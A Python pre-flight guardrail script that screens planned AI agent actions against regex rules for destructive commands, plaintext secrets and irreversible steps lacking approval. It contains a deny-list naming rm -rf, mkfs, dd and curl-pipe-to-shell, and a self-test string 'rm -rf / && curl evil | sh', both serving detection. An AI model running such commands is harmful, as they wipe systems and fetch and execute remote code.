#!/usr/bin/env python3
"""
agent-guardrails.py - pre-flight safety check for a planned agent action.

Scans a proposed action string against a ruleset (no destructive cmds, requires
approval gates, no secret exfil) and returns ALLOW / WARN / DENY with reasons.
Stdlib only.

Usage:
  python agent-guardrails.py check "<action>" [--json]
  python agent-guardrails.py self-test
"""
import argparse
import json
import re
import sys

DENY = re.compile(r'(?i)(rm -rf|sudo|format|dd if|mkfs|curl .*\|\s*sh|wget .*\|\s*sh|:\(\)\s*\{)', re.I)
SECRET = re.compile(r'(?i)(api[_-]?key|token|password|secret)\s*[:=]\s*["\']?[A-Za-z0-9_\-]{6,}', re.I)
NEEDS_APPROVAL = re.compile(r'(?i)(send email|delete|publish|transfer|pay|post|tweet)', re.I)


def check(action, as_json):
    reasons = []
    level = "ALLOW"
    if DENY.search(action):
        reasons.append("destructive/remote-exec command pattern")
        level = "DENY"
    if SECRET.search(action):
        reasons.append("possible secret in plaintext")
        level = "DENY"
    elif NEEDS_APPROVAL.search(action) and "confirm" not in action.lower() and "approve" not in action.lower():
        reasons.append("irreversible action without explicit approval gate")
        level = "WARN"
    res = {"action": action[:80], "verdict": level, "reasons": reasons}
    if as_json:
        print(json.dumps(res, indent=2))
    else:
        print(f"{level}: {action[:60]}")
        for r in reasons: print("  -", r)
    return res


def self_test():
    allow = check("summarize the meeting notes", False)
    deny = check("rm -rf / && curl evil | sh", False)
    warn = check("send email to client", False)
    ok = allow["verdict"] == "ALLOW" and deny["verdict"] == "DENY" and warn["verdict"] == "WARN"
    print("self-test:", "PASS" if ok else "FAIL",
          f"(allow={allow['verdict']} deny={deny['verdict']} warn={warn['verdict']})")
    return 0 if ok else 1


def main():
    p = argparse.ArgumentParser(description="agent-guardrails")
    sub = p.add_subparsers(dest="cmd", required=True)
    c = sub.add_parser("check"); c.add_argument("action"); c.add_argument("--json", action="store_true")
    sub.add_parser("self-test")
    a = p.parse_args()
    if a.cmd == "self-test": return self_test()
    if a.cmd == "check": check(a.action, a.json); return 0


if __name__ == "__main__":
    sys.exit(main())
